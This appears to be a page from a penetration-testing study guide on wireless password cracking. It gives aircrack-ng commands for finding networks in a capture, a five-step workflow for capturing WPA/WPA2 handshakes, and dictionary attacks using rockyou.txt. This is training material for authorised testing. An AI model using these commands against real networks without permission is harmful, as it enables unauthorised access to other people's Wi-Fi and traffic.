---
layout: default
title: Domain 7 - Wireless Network Cracking
parent: Domains
nav_order: 7
description: "WPA/WPA2 password cracking and wireless network penetration testing with Aircrack-ng."
has_children: true
---

# Domain 7: Wireless Network Cracking

## Overview

WiFi networks protect data with encryption. Learning to capture and crack wireless passwords is essential for penetration testing.

**Key Topics:**
- WPA/WPA2 password cracking
- Wireless attack workflow (5 steps)
- Handshake capture
- Dictionary attacks
- BSSID identification

**Duration:** 10-20 minutes per task  
**Difficulty:** Easy to Medium  
**Tools:** Aircrack-ng, airmon-ng, airodump-ng

---

## 7.1 WPA/WPA2 Password Cracking

### Finding Networks in Capture

```bash
# Analyze capture file for networks
aircrack-ng Credmapwifi.cap

# Shows all networks with BSSID
```

### Cracking Password

```bash
# With known BSSID
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF Credmapwifi.cap

# Without BSSID (tries all)
aircrack-ng -w wordlist.txt Credmapwifi.cap
```

---

## 7.2 Wireless Attack Workflow (5 Steps)

### Step 1: Find Target

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```

### Step 2: Create Monitor Interface

```
# wlan0 is now in monitor mode (wlan0mon)
```

### Step 3: Capture Handshake

```bash
sudo airodump-ng -c [CHANNEL] --bssid [BSSID] -w capture wlan0mon
# Wait for "WPA handshake" message in upper right
```

### Step 4: Crack Password

```bash
aircrack-ng -w rockyou.txt capture.cap
# Shows: KEY FOUND! [ PasswordHere ]
```

### Step 5: Cleanup

```bash
airmon-ng stop wlan0mon
```

---

## See Also

- **[Commands Reference](commands.html)**
- **[Challenges](challenges.html)**
- **[QUICK-START.md](../QUICK-START.html)** - Time management

---

**Next Step:** Review [commands.md](commands.html) and practice [challenges.md](challenges.html)
